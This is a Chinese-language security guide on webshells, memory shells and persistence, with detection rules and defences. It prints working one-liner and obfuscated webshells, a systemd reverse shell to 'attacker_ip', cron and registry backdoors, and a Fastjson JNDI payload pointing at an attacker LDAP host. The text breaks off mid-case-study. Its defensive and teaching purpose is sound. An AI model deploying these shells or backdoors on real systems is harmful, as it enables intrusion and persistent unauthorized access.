# WebShell与权限维持指南

> 本文档系统化讲解WebShell技术全栈知识，涵盖一句话木马/大马/内存马原理、主流管理工具流量特征与检测、权限维持技术体系，以及检测防御方案。理论与实战结合，所有代码示例仅用于安全研究与授权测试。

---

## 目录

1. [WebShell概述](#1-webshell概述)
2. [一句话木马原理与检测](#2-一句话木马原理与检测)
3. [WebShell管理工具详解](#3-webshell管理工具详解)
4. [内存马技术](#4-内存马技术)
5. [权限维持技术](#5-权限维持技术)
6. [WebShell检测与防御](#6-webshell检测与防御)
7. [实战案例](#7-实战案例)

---

## 1. WebShell概述

### 1.1 什么是WebShell

WebShell是以Web脚本文件形式存在的后门程序，攻击者通过它对Web服务器执行任意命令、管理文件、维持访问权限。WebShell通常在攻击者获取Web应用写入能力（文件上传、反序列化写入、包含漏洞等）后植入，是攻防对抗中的核心枢纽。

**WebShell的核心能力：**

| 能力 | 说明 | 典型实现 |
|------|------|----------|
| 命令执行 | 在服务器上执行系统命令 | system()/exec()/Runtime.exec() |
| 文件管理 | 上传/下载/编辑/删除文件 | 文件操作API |
| 数据库操作 | 连接并操作数据库 | MySQL/Oracle/SQLServer连接器 |
| 信息收集 | 读取系统信息、环境变量 | phpinfo()/系统API |
| 权限提升 | 尝试提权操作 | 反弹Shell/内核漏洞利用 |
| 代理转发 | 作为内网跳板 | 端口转发/Socks代理 |

### 1.2 WebShell分类

```
WebShell分类体系:
├── 按功能复杂度分类
│   ├── 一句话木马（一句话/小马）→ 仅一行核心代码，需配合管理工具
│   ├── 小马 → 简化版多功能Shell，基本文件操作+命令执行
│   └── 大马 → 全功能WebShell，含文件管理/数据库/端口扫描/代理等
│
├── 按运行形态分类
│   ├── 落地型WebShell → 以文件形式存在于磁盘（可被静态扫描发现）
│   ├── 内存马（Memory Shell）→ 不落地磁盘，驻留在进程内存中
│   └── 不死马/僵尸马 → 通过进程守护循环复活
│
└── 按语言类型分类
    ├── PHP WebShell → 最常见，PHP应用广泛
    ├── JSP/Java WebShell → Tomcat/Spring等Java中间件
    ├── ASP/ASPX WebShell → IIS + .NET环境
    ├── Python WebShell → Flask/Django等框架
    └── Node.js WebShell → Express/Koa等
```

### 1.3 一句话/小马/大马对比

| 特性 | 一句话木马 | 小马 | 大马 |
|------|-----------|------|------|
| 代码体积 | 1行核心代码 | 数十行 | 数百至数千行 |
| 功能 | 仅命令执行入口 | 基本文件管理+命令执行 | 全功能管理面板 |
| 依赖工具 | 必须配合管理工具 | 可独立使用 | 可独立使用 |
| 隐蔽性 | 极高 | 中 | 低（特征明显） |
| 检测难度 | 难（需行为检测） | 中 | 易（特征匹配） |
| 典型示例 | `<?php @eval($_POST['cmd']);?>` | 简化版PHP Spy | 中国菜刀大马/C99/r57 |

### 1.4 管理工具对比概览

| 工具 | 语言/平台 | 流量特征 | 加密能力 | 检测难度 |
|------|----------|----------|----------|----------|
| 中国菜刀(Chopper) | Delphi/Windows | 明文/简单编码 | 无 | 易检测 |
| 蚁剑(AntSword) | Node.js/跨平台 | 自定义编码 | 支持 | 中等 |
| 冰蝎(Behinder) | Java/跨平台 | AES加密流量 | 强加密 | 难检测 |
| Godzilla(哥斯拉) | Java/跨平台 | AES/Base64+自定义 | 强加密 | 难检测 |

---

## 2. 一句话木马原理与检测

### 2.1 一句话木马核心原理

一句话木马的本质是：**将外部传入的参数作为代码执行**。其核心是利用语言的动态代码执行能力：

```
执行链路:
用户请求 → Web服务器接收参数 → 代码执行函数动态执行参数内容 → 返回结果

关键函数:
PHP:   eval() / assert() / create_function() / call_user_func() / preg_replace(/e)
Java:   Runtime.exec() / ProcessBuilder / ScriptEngine.eval()
ASP:    Execute() / ExecuteGlobal() / Eval()
JSP:   <%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>
```

### 2.2 各语言一句话木马

#### 2.2.1 PHP一句话

**基础形态：**

```php
<?php @eval($_POST['cmd']); ?>
```

- `@`：抑制错误输出，增强隐蔽性
- `eval()`：执行字符串作为PHP代码
- `$_POST['cmd']`：从POST参数接收代码

**变形1 - assert利用：**

```php
<?php @assert($_POST['cmd']); ?>
```

PHP 7.0之前assert可执行字符串代码，是eval的非官方替代。

**变形2 - create_function：**

```php
<?php $f=create_function('',$_POST['cmd']);$f(); ?>
```

通过创建匿名函数绕过对eval/assert的直接检测。

**变形3 - call_user_func：**

```php
<?php call_user_func('assert',$_POST['cmd']); ?>
```

利用回调函数间接调用assert。

**变形4 - preg_replace /e修饰符：**

```php
<?php preg_replace("/test/e",$_POST['cmd'],"test"); ?>
```

PHP 5.5之前/e修饰符会执行替换字符串作为PHP代码。

#### 2.2.2 JSP/Java一句话

```jsp
<%
    if(request.getParameter("cmd")!=null){
        Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));
        java.io.InputStream is=p.getInputStream();
        int i;
        while((i=is.read())!=-1) out.print((char)i);
    }
%>
```

Java一句话通常通过`Runtime.exec()`或`ProcessBuilder`执行系统命令，也可通过ScriptEngine执行JavaScript代码：

```java
// 通过ScriptEngine执行
ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
engine.eval(request.getParameter("cmd"));
```

#### 2.2.3 ASP/ASPX一句话

**ASP：**

```asp
<%eval request("cmd")%>
```

**ASPX：**

```aspx
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]); %>
```

### 2.3 免杀变形技术

免杀（Anti-Detection）的目的是绕过WAF和查杀工具的静态特征检测：

```
免杀技术体系:
├── 函数替换
│   ├── eval → assert / call_user_func / create_function
│   ├── $_POST → $_REQUEST / $_COOKIE / $_SERVER['HTTP_X']
│   └── 字符串拼接: $a='ev';$b='al';$a.$b($_POST['cmd'])
│
├── 编码混淆
│   ├── Base64编码: eval(base64_decode($_POST['cmd']))
│   ├── 字符异或: ~(\x8C\x86\x8C\x86\x9C) → "assert"
│   ├── 字符串旋转/反转: strrev('lave')
│   └── 自定义加解密
│
├── 结构变形
│   ├── 注释拆分: $a='ev';/*comment*/$b='al';$a.$b(...)
│   ├── 变量函数: $func='assert';$func($_POST['cmd'])
│   ├── 类方法封装: class中定义__destruct调用eval
│   └── 引入外部文件: include/require隐藏文件
│
├── 特征消除
│   ├── 去除关键字: 避免出现eval/assert等敏感词
│   ├── 混入正常代码: 嵌入合法业务文件中
│   └── 利用框架特性: 模板引擎/路由机制
│
└── 环境利用
    ├── .htaccess: php_value auto_prepend_file
    ├── .user.ini: auto_prepend_file=shell.jpg
    └── Nginx/Apache配置文件包含
```

**PHP免杀变形示例：**

```php
<?php
// 变形1：异或免杀
$s = '~\x8C\x86\x8C\x86\x9C'; // 异或后为assert
$s = ~$s{'0'}.$s{'1'}.$s{'2'}.$s{'3'}.$s{'4'};
$s($_POST['cmd']);

// 变形2：数组回调
array_map($_GET['func'], array_fill(0, 1, $_POST['cmd']));

// 变形3：类与魔术方法
class Shell {
    function __destruct() {
        $f = str_rot13('riny'); // riny rot13 → eval
        $f($_POST['cmd']);
    }
}
new Shell();
?>
```

### 2.4 WAF绕过思路

| 绕过方式 | 原理 | 示例 |
|----------|------|------|
| 参数名变形 | 避免使用常见参数名cmd/shell | 使用随机参数名或HTTP头传参 |
| 传输方式变换 | GET→POST→COOKIE→HEADER | `Cookie: cmd=system('id');` |
| 内容编码 | Base64/GZinflate/base16 | `eval(gzinflate(base64_decode(...)))` |
| 分块传输 | Transfer-Encoding: chunked | 分块发送绕过内容检测 |
| 畸形请求 | 畸形HTTP请求绕过解析 | 利用解析差异 |
| 大体积请求 | 超长请求体绕过WAF检测限制 | 填充大量垃圾数据 |

---

## 3. WebShell管理工具详解

### 3.1 中国菜刀（Chopper）

**概述：** 中国菜刀是最早的WebShell管理工具之一，使用Delphi开发，仅支持Windows平台。其流量以明文或简单编码传输，特征容易被WAF识别。

**工作原理：**

```
菜刀通信流程:
1. 用户在菜刀中输入Shell URL和密码
2. 菜刀向URL发送POST请求，参数名为密码值
3. POST内容为待执行的PHP/JSP/ASP代码
4. 服务器执行代码并返回结果
5. 菜刀解析返回内容并展示
```

**流量特征：**

```
典型菜刀流量:
POST /shell.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

cmd=dd%7Cdd...base64编码的命令...

特征点:
- 参数名通常为短密码（cmd/pass等）
- 使用Base64编码传输命令
- 流量中出现固定UA或固定格式
- 请求体含明文命令关键字
```

**检测：** 流量明文，WAF通过正则匹配关键字段即可检测。

### 3.2 蚁剑（AntSword）

**概述：** 蚁剑是一款开源的跨平台WebShell管理工具，基于Node.js开发，支持PHP/JSP/ASP等多种语言，提供编码器和加密器插件机制。

**核心特性：**

| 特性 | 说明 |
|------|------|
| 跨平台 | Windows/Linux/macOS |
| 插件系统 | 编码器/加密器/数据处理插件 |
| 编码方式 | Base64/chr/rot13等可自定义 |
| 流量加密 | 可通过插件实现AES等加密 |
| 自定义编码器 | 用户可编写JS编码脚本 |

**流量特征：**

```
蚁剑默认流量（Base64编码）:
POST /shell.php HTTP/1.1

ant=eval%28base64_decode%28%22...%22%29%29

特征:
- 请求参数名通常为ant
- 内容经过编码处理
- 可通过自定义编码器混淆特征
```

**自定义编码器示例：**

```javascript
// 蚁剑自定义编码器（JS）
module.exports = {
    encode: function(payload) {
        // 自定义编码逻辑
        let encoded = base64.encode(payload);
        return `eval(base64_decode("${encoded}"));`;
    },
    decode: function(raw) {
        // 解码返回内容
        return raw;
    }
};
```

### 3.3 冰蝎（Behinder）

**概述：** 冰蝎是一款基于Java开发的WebShell管理工具，其核心优势是使用AES加密通信流量，大幅提升了对抗WAF检测的能力。

**核心特性：**

| 特性 | 说明 |
|------|------|
| 流量加密 | AES-128-CBC加密通信内容 |
| 密钥协商 | 前期使用预共享密钥或动态协商 |
| 多语言支持 | PHP/JSP/ASP/ASPX |
| 插件机制 | 支持自定义插件扩展功能 |
| 静态特征少 | 服务器端Shell代码精简 |

**通信流程：**

```
冰蝎通信流程:
1. 密钥阶段:
   - 客户端发送密钥协商请求
   - 服务器返回16字节密钥（MD5前16位等）
   - 或使用预共享密钥

2. 加密通信阶段:
   - 客户端将Payload用AES加密
   - 服务器端Shell解密并执行
   - 返回内容同样AES加密
   - 客户端解密展示

流量特征:
- POST请求体为加密数据（看似随机字节）
- 无明显关键字
- Content-Type可能为application/octet-stream
- 前几个请求为密钥协商
```

**冰蝎服务器端Shell（PHP示例）：**

```php
<?php
// 冰蝎PHP Shell（简化示意）
$key = md5('rebeyond');  // 预共享密钥
$post = file_get_contents('php://input');
$post = openssl_decrypt($post, 'AES-128-CBC', $key, OPENSSL_RAW_DATA);
// 执行解密后的代码
@eval($post);
?>
```

**检测思路：**
- 检测前几个请求的密钥协商行为
- 检测AES加密流量的统计特征
- 检测固定的Content-Type和请求模式
- 行为分析：检测频繁的加密通信

### 3.4 Godzilla（哥斯拉）

**概述：** Godzilla是较新的Java WebShell管理工具，在冰蝎基础上进一步改进，支持多种加密方式，流量特征更难检测。

**核心特性：**

| 特性 | 说明 |
|------|------|
| 加密方式 | AES/Base64/自定义组合 |
| 密码与密钥 | 分离密码和加密密钥 |
| 多语言支持 | PHP/JSP/ASP/ASPX |
| 会话管理 | Session维持，支持Cookie |
| 多种编码 | 支持URL编码/Base64/原始格式 |

**对比总结：**

| 维度 | 中国菜刀 | 蚁剑 | 冰蝎 | Godzilla |
|------|---------|------|------|----------|
| 流量加密 | 无 | 可选 | AES强制 | AES+多层 |
| 检测难度 | 易 | 中 | 难 | 难 |
| 跨平台 | 否 | 是 | 是 | 是 |
| 扩展性 | 低 | 高(插件) | 中 | 中 |
| 上手难度 | 低 | 中 | 中 | 中 |
| 适用场景 | 简单环境 | 通用 | 绕WAF | 高级对抗 |

---

## 4. 内存马技术

### 4.1 内存马概述

内存马（Memory Shell）是WebShell的进阶形态，不落地磁盘文件，驻留在Web进程的内存中。由于不产生磁盘文件，传统基于文件扫描的检测手段失效，是当前攻防对抗的热点。

```
内存马 vs 传统WebShell:
┌─────────────┬────────────────┬────────────────┐
│    特性      │  传统WebShell   │    内存马      │
├─────────────┼────────────────┼────────────────┤
│ 文件落地     │ 是              │ 否             │
│ 文件扫描检测 │ 有效            │ 无效           │
│ 持久性       │ 高（重启存在）  │ 低（重启消失）│
│ 隐蔽性       │ 低-中           │ 高             │
│ 实现难度     │ 低              │ 中-高          │
│ 检测难度     │ 中              │ 高             │
└─────────────┴────────────────┴────────────────┘
```

### 4.2 PHP内存马

PHP内存马利用`ignore_user_abort`和`set_time_limit`实现进程不死循环，常用于不死马（僵尸马）：

```php
<?php
// PHP不死马示例（仅用于安全研究）
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);  // 删除自身文件
$file = '/var/www/html/.hidden_shell.php';
$code = '<?php @eval($_POST["cmd"]); ?>';

while (true) {
    file_put_contents($file, $code);
    usleep(10000);  // 每10ms重新生成
}
?>
```

**工作原理：**
1. `ignore_user_abort(true)`：即使客户端断开连接，脚本继续执行
2. `set_time_limit(0)`：取消执行时间限制
3. `unlink(__FILE__)`：删除自身文件，消除磁盘痕迹
4. 循环写入Shell文件：即使被删除也会立即重建

**清除方法：**
- 创建一个同名文件并锁定写入权限
- 重启Web服务（Apache/Nginx/PHP-FPM）
- 使用`ps`查找对应PHP进程并kill

### 4.3 Java Filter内存马

Java Filter内存马通过动态注册恶意Filter，拦截所有请求并在特定条件下执行命令：

**实现原理：**

```java
// Java Filter内存马核心逻辑（概念示意）
// 1. 获取StandardContext
// 2. 创建恶意Filter
// 3. 动态注册到FilterChain

public class MemoryShellFilter implements Filter {
    public void doFilter(ServletRequest req, ServletResponse res, 
                         FilterChain chain) {
        HttpServletRequest request = (HttpServletRequest) req;
        String cmd = request.getHeader("X-Cmd");
        if (cmd != null) {
            // 执行命令并返回
            Process p = Runtime.getRuntime().exec(cmd);
            // ... 输出结果
            return;
        }
        chain.doFilter(req, res);  // 正常请求放行
    }
}

// 注册Filter的常见路径:
// 1. 通过ServletContext.addFilter()（Servlet 3.0+）
// 2. 通过反射操作StandardContext的filterDefs/filterMaps
// 3. 通过Tomcat Instrumentation API
```

**注入方式：**
- 反序列化漏洞触发
- JNDI注入
- 表达式注入（OGNL/SpEL/MVEL）
- 文件包含/上传漏洞

### 4.4 Java Agent内存马

Java Agent内存马利用Java Instrumentation机制，在JVM启动时或运行时通过Agent注入恶意代码：

```
Java Agent内存马原理:
1. 编写Agent JAR，包含premain或agentmain方法
2. 在Instrumentation.addTransformer中注册ClassFileTransformer
3. 拦截关键类（如HTTP请求处理类）的字节码
4. 在字节码层面注入恶意逻辑
5. 不修改磁盘上的class文件，仅修改内存中的类定义

优势:
- 无需修改Web应用代码
- 可拦截JVM层面的所有类加载
- 极难检测（不落地文件，不注册Filter）
```

**检测思路：**
- 检测JVM启动参数中的`-javaagent`
- 检测运行时Attach API调用
- 对比磁盘class文件与内存中类定义的差异
- JVM安全工具（如Byteman监控）

### 4.5 Tomcat Valve内存马

Tomcat Valve是管道式请求处理组件，可拦截所有请求：

```java
// Tomcat Valve内存马概念
// 通过反射向StandardHost/StandardContext添加Valve
public class MemoryShellValve extends ValveBase {
    @Override
    public void invoke(Request request, Response response) 
        throws IOException, ServletException {
        String cmd = request.getHeader("X-Cmd");
        if (cmd != null) {
            // 执行命令
            // ...
            response.getWriter().write(result);
            return;
        }
        getNext().invoke(request, response);  // 放行
    }
}
```

**特点：**
- Valve作用于Host/Engine级别，拦截范围比Filter更广
- 通过反射操作Tomcat内部组件注册
- 需要能访问Tomcat内部API（通常通过反射获取）

### 4.6 内存马对比

| 类型 | 语言 | 拦截层级 | 持久性 | 检测难度 |
|------|------|----------|--------|----------|
| PHP不死马 | PHP | 文件重建循环 | 中（需重启） | 中 |
| Filter马 | Java | Filter链 | 低（重启消失） | 高 |
| Listener马 | Java | Servlet监听器 | 低 | 高 |
| Agent马 | Java | 字节码层 | 中（Agent驻留） | 极高 |
| Valve马 | Java | Tomcat管道 | 低 | 高 |
| Interceptor马 | Java | 框架拦截器 | 低 | 高 |

---

## 5. 权限维持技术

### 5.1 权限维持概述

权限维持（Persistence）是攻击者在获取系统访问权限后，确保未来能够持续访问的技术。在Web安全场景中，权限维持既包括Web层面的WebShell隐藏，也包括系统层面的后门植入。

```
权限维持技术分层:
├── Web层维持
│   ├── WebShell隐藏（文件名/路径/内容混淆）
│   ├── 不死马/僵尸马（循环复活）
│   ├── .htaccess/.user.ini配置后门
│   └── 框架后门（路由/中间件注入）
│
├── 系统层维持
│   ├── 定时任务（cron/Task Scheduler）
│   ├── 启动项/注册表
│   ├── 服务后门
│   ├── SSH密钥后门
│   └── 内核模块rootkit
│
└── 应用层维持
    ├── 数据库触发器后门
    ├── 框架配置注入
    └── 中间件配置篡改
```

### 5.2 WebShell隐藏技术

**文件名/路径隐藏：**

```bash
# 常见隐藏方式
# 1. 利用系统隐藏属性（Linux以.开头）
/var/www/html/.config/shell.php

# 2. 利用深目录路径
/var/www/html/uploads/2023/01/util/config/.shell.php

# 3. 伪装成系统/框架文件
/var/www/html/vendor/symfony/http-foundation/Kernel.php

# 4. 利用空字节截断（旧版本）
shell.php%00.jpg

# 5. 利用ADS（NTFS备用数据流，Windows）
shell.php:HiddenStream
```

**内容混淆隐藏：**

```php
<?php
// 嵌入正常文件中的隐蔽Shell
// 伪装为配置文件
$config = array(
    'db_host' => 'localhost',
    'db_user' => 'root',
    'db_pass' => 'password',
);

// 隐蔽后门：仅当特定参数存在时触发
if (isset($_SERVER['HTTP_X_AUTH']) && 
    $_SERVER['HTTP_X_AUTH'] === 'secret_key_12345') {
    @eval($_REQUEST['cmd']);
}
// 正常配置输出
return $config;
?>
```

**.htaccess后门：**

```apache
# .htaccess将图片文件作为PHP执行
AddType application/x-httpd-php .jpg

# 或利用auto_prepend_file
php_value auto_prepend_file "/var/www/html/.hidden/prepend.php"

# 配合正常图片文件（图片马）
# shell.jpg内容: GIF89a <?php @eval($_POST['cmd']); ?>
```

**.user.ini后门（PHP）：**

```ini
; .user.ini文件放在Web目录中
; PHP在执行目录中的PHP文件前自动加载
auto_prepend_file = "/var/www/html/.hidden/shell.php"
```

### 5.3 不死马/僵尸马

不死马通过循环写入或进程守护实现WebShell的持续存活：

**Linux进程守护型：**

```bash
#!/bin/bash
# 不死马守护脚本（仅用于安全研究）
while true; do
    # 不断重新写入WebShell
    echo '<?php @eval($_POST["cmd"]); ?>' > /var/www/html/.config.php
    # 同时检查并重启守护进程
    pgrep -f "guard.sh" || nohup bash guard.sh &
    sleep 1
done
```

**清除方法：**

```bash
# 1. 创建不可变属性文件
chattr +i /var/www/html/.config.php  # 先锁定让攻击者写不进去
# 然后删除
rm -f /var/www/html/.config.php

# 2. 杀死所有相关进程
ps aux | grep -E 'guard|hidden' | awk '{print $2}' | xargs kill -9

# 3. 重启Web服务
systemctl restart apache2
# 或
systemctl restart php-fpm
```

### 5.4 定时任务后门

**Linux Cron后门：**

```bash
# 写入crontab
(crontab -l; echo "*/5 * * * * /bin/bash -c 'echo <?php @eval(\$_POST[\"cmd\"]); ?> > /var/www/html/.shell.php'") | crontab -

# 隐藏crontab
# 利用隐藏字符或非标准crontab位置
echo "*/30 * * * * /tmp/.malware" >> /etc/cron.d/.hidden
```

**Windows计划任务后门：**

```powershell
# 创建隐藏计划任务
schtasks /create /tn "SystemUpdate" /tr "powershell -enc <base64_payload>" /sc minute /mo 5 /ru SYSTEM

# 利用WMI事件订阅（更隐蔽）
$eventFilter = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance isa 'Win32_PerfFormattedData_PerfOS_System'"
$command = "powershell -enc <base64_payload>"
# WMI事件订阅持久化
```

### 5.5 注册表后门（Windows）

```
Windows注册表自启动位置:
├── HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
├── HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
├── HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
├── HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon (Userinit)
├── HKLM\SYSTEM\CurrentControlSet\Services（服务）
├── HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
├── HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components
└── HKLM\SOFTWARE\Classes\*\shell\open\command（文件关联）
```

**利用映像劫持（IFEO）：**

```registry
# 注册表路径
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe
# 添加Debugger值
Debugger = "C:\Windows\System32\cmd.exe"
# 敲击5次Shift键即可触发cmd
```

### 5.6 服务后门

**Linux服务后门（systemd）：**

```ini
# /etc/systemd/system/system-update.service
[Unit]
Description=System Update Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
```

```bash
systemctl enable system-update
systemctl start system-update
```

**Windows服务后门：**

```powershell
# 创建恶意服务
sc create "SystemMonitor" binpath= "C:\Windows\Temp\backdoor.exe" start= auto
sc description "SystemMonitor" "System Performance Monitor"
sc start "SystemMonitor"
```

### 5.7 SSH密钥后门

```bash
# 攻击者写入公钥到authorized_keys
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3Nza... attacker@host" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 隐藏版本：写入到多个用户的authorized_keys
# 利用低权限用户作为跳板
```

---

## 6. WebShell检测与防御

### 6.1 静态检测

静态检测通过分析文件内容特征来发现WebShell：

```
静态检测方法:
├── 特征匹配
│   ├── 关键字检测: eval/assert/system/exec/passthru
│   ├── 敏感函数组合: eval+$_POST/assert+$_REQUEST
│   └── 已知Shell特征库: 中国菜刀/暗剑/C99等特征
│
├── 语法分析
│   ├── PHP AST分析: 识别危险语法结构
│   ├── 变量追踪: 追踪数据从输入到执行的流
│   └── 污点分析: 标记外部输入到执行函数的路径
│
├── 统计分析
│   ├── 信息熵: 加密WebShell熵值偏高
│   ├── 文件特征: 超短文件/异常文件名
│   └── 文件权限: Web目录中可执行文件
│
└── 机器学习分类
    ├── 基于AST特征的分类模型
    ├── 基于N-gram的文本分类
    └── 基于TF-IDF的相似度检测
```

**常见静态检测工具：**

| 工具 | 说明 | 适用 |
|------|------|------|
| WebShellKill（D盾） | Windows平台查杀 | PHP/ASP/JSP |
| 河马（HMShell） | 云查杀+本地引擎 | 多语言 |
| NEO-İnn　| 智能分析引擎 | PHP/Java |
| LOKI | IOC检测 | 多类型 |
| YARA | 规则引擎 | 自定义规则 |

**YARA规则示例：**

```yara
rule WebShell_PHP_OneLiner {
    meta:
        description = "PHP One-liner WebShell"
        author = "Security Team"
    strings:
        $eval_post = /eval\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)/
        $assert_post = /assert\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)/
        $system_call = /(system|exec|passthru|shell_exec)\s*\(/
        $base64_eval = /eval\s*\(\s*(base64_decode|gzinflate|gzuncompress)/
    condition:
        any of ($eval_post, $assert_post) or
        ($base64_eval) or
        (filesize < 500 and $system_call)
}
```

### 6.2 动态检测

动态检测通过运行时行为分析来发现WebShell：

```
动态检测维度:
├── 文件操作行为
│   ├── Web目录文件创建/修改
│   ├── 异常文件写入（隐藏文件/深目录）
│   └── 文件权限变更
│
├── 进程行为
│   ├── Web进程派生子进程（如/bin/sh）
│   ├── 异常命令执行（whoami/id/ifconfig）
│   └── 反弹Shell连接
│
├── 网络行为
│   ├── 外连异常IP/端口
│   ├── DNS异常查询
│   └── 加密流量通信模式
│
├── 系统调用
│   ├── hook execve/system等系统调用
│   ├── 监控文件系统调用(inotify)
│   └── 网络连接监控
│
└── 运行时信息
    ├── PHP运行时: disable_functions检查
    ├── Java: JMX监控、Instrumentation检测
    └── 进程内存分析
```

### 6.3 流量检测

流量检测是发现WebShell通信的关键手段：

```
流量检测策略:
├── 菜刀流量检测
│   ├── 规则: POST参数含base64编码的命令
│   ├── 特征: 明文命令关键字
│   └── 告警: 命中规则即告警
│
├── 蚁剑流量检测
│   ├── 规则: 请求参数含eval+编码
│   ├── 特征: Base64编码的PHP代码
│   └── 告警: 异常编码+执行模式
│
├── 冰蝎流量检测
│   ├── 规则: AES加密流量+密钥协商阶段
│   ├── 特征: 前几个请求的特殊模式
│   ├── 统计: 加密流量的熵值分析
│   └── 告警: 异常加密通信模式
│
└── Godzilla流量检测
    ├── 规则: 组合加密+Session维持
    ├── 特征: 密码+密钥分离模式
    └── 告警: 加密POST+频繁通信
```

**Snort规则示例：**

```
# 检测菜刀流量
alert tcp any any -> $HOME_NET $HTTP_PORTS (msg:"WebShell Chopper Traffic"; 
    content:"POST"; http_method; 
    content:"eval"; http_client_body; 
    content:"base64_decode"; http_client_body; 
    reference:url,security/chopper; sid:1000001;)

# 检测蚁剑流量
alert tcp any any -> $HOME_NET $HTTP_PORTS (msg:"WebShell AntSword Traffic"; 
    content:"ant="; http_client_body;
    pcre:"/eval\s*\(\s*base64_decode/Ui";
    sid:1000002;)
```

### 6.4 内存马检测

内存马不落地文件，检测需要从运行时入手：

```
Java内存马检测:
├── Filter/Listener检测
│   ├── 枚举所有已注册Filter和Listener
│   ├── 对比标准配置与实际注册项
│   └── 检查Filter的doFilter实现是否含恶意逻辑
│
├── Agent检测
│   ├── 检查JVM启动参数-javaagent
│   ├── 检测运行时Attach操作
│   ├── 对比磁盘class与内存class定义
│   └── 检测ClassFileTransformer列表
│
├── Valve检测
│   ├── 枚举Tomcat Container的Pipeline
│   ├── 检查Valve列表是否有异常项
│   └── 分析Valve实现类来源
│
└── 综合检测
    ├── JVM内存dump分析
    ├── Java Agent注入检测工具（如arthas/jstack）
    └── RASP实时监控
```

### 6.5 防御措施

**Web层防御：**

| 防御措施 | 说明 | 效果 |
|----------|------|------|
| 文件上传限制 | 白名单后缀+内容检测 | 阻断植入 |
| disable_functions | 禁用eval/system/exec等 | 限制执行 |
| open_basedir | 限制PHP文件访问范围 | 限制操作 |
| WAF防护 | 规则+语义分析 | 流量拦截 |
| 文件监控 | Web目录文件变更告警 | 快速发现 |
| 定期查杀 | 静态+动态扫描 | 清除Shell |
| RASP防护 | 运行时自我保护 | 拦截执行 |

**系统层防御：**

```bash
# 1. 文件完整性监控
# AIDE (Advanced Intrusion Detection Environment)
aide --init        # 初始化数据库
aide --check       # 检查文件完整性

# 2. 进程监控
# 监控Web进程派生的异常子进程
ps aux | grep -E 'www-data.*\ (sh|bash|python)'

# 3. 网络连接监控
# 检测反弹Shell
ss -tlnp | grep -v -E ':(80|443|22)\ '
netstat -antp | grep ESTABLISHED

# 4. cron监控
ls -la /etc/cron.d/ /var/spool/cron/
cat /etc/crontab

# 5. 日志审计
# 检查异常的命令执行日志
grep -i "system\|exec\|eval" /var/log/nginx/access.log
```

---

## 7. 实战案例

### 7.1 案例1：文件上传获取WebShell

**场景：** 通过文件上传漏洞植入WebShell的完整流程。

**环境：** 靶场Web应用，存在文件上传功能。

**步骤：**

```
步骤1: 信息收集
- 发现上传点: /upload.php
- 测试上传限制: 仅允许jpg/png/gif
- 识别后端: PHP + Apache

步骤2: 绕过上传限制
方法A - 后缀绕过:
- 尝试 .php5 / .phtml / .pht
- Apache配置可能将 .phtml 作为PHP执行

方法B - 内容类型绕过:
- 拦截请求修改Content-Type: application/octet-stream
- → Content-Type: image/jpeg

方法C - 文件头伪造:
- 在PHP代码前添加GIF文件头: GIF89a
- 最终内容: GIF89a <?php @eval($_POST['cmd']); ?>

步骤3: 上传成功
- Shell路径: /uploads/2023/01/shell.jpg
- 访问验证: 确认Shell可执行

步骤4: 连接管理工具
- 使用蚁剑/冰蝎连接
- URL: http://target/uploads/2023/01/shell.jpg
- 密码: cmd

步骤5: 权限维持
- 横向移动: 查找其他可写目录
- 权限提升: 尝试内核漏洞/SUID提权
- 植入持久化后门
```

**防御建议：**
- 白名单后缀验证（后端验证，非前端）
- 文件内容检测（文件头+MIME类型+重渲染）
- 上传文件重命名（随机文件名+移出Web目录）
- 上传目录禁止执行（Apache: `php_flag engine off`）
- 文件存储与Web服务分离

### 7.2 案例2：反序列化注入内存马

**场景：** 利用Java反序列化漏洞注入Filter内存马，实现无文件驻留。

**漏洞背景：**
- 目标运行Tomcat + 含Fastjson 1.2.24（反序列化漏洞）
- 可通过JNDI注入加载恶意类

**攻击流程：**

```
步骤1: 漏洞确认
- 探测Fastjson版本: 发送特制JSON
- 确认可触发JNDI注入: 
  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}

步骤2: 准备恶意类
- 编写Java类，在static块中注入Filter内存马
- 关键代码:
  - 通过反射获取StandardContext
  - 创建恶意Filter
  - 添加FilterDef和FilterMap
  - 命令通过HTTP Header传递

步骤3: JNDI注入
- 在攻击者机器启动LDAP服务
- 目标触发反序列化 → JNDI查询 → 加载恶意类
- 恶意类在目标JVM中执行，注册恶意Filter

步骤4: 使用内存马
- 通过HTTP Header传递命令: X-Cmd: whoami
- 服务器返回命令执行结果
- 无磁盘文件产生

步骤5: 检测与清理
- 检测: 分析JVM Filter列表，对比正常配置
- 清理: 重启Tomcat服务（内存马重启消失）
```

**防御建议：**
- 升级Fastjson至最新版本或替换为Jackson
- 启用Fastjson AutoType白名单
- JNDI外连限制（禁止外连攻击者LDAP/RMI服务）
- RASP防护：拦截反序列化和反射操作
- JVM启动参数限制：`-Dcom.sun.jndi.ldap.object.trustURLCodebase=false`

### 7.3 案例3：不死马清除实战

**场景：** 应急响应中发现PHP不死马，需要彻底清除。

**发现过程：**

```
告警: WAF检测到频繁的PHP代码执行请求
排查:
1. 检查Web目录 → 发现 .config.php 文件
2. 删除 .config.php → 几秒后文件重新出现
3. 确认为不死马（循环写入）

分析:
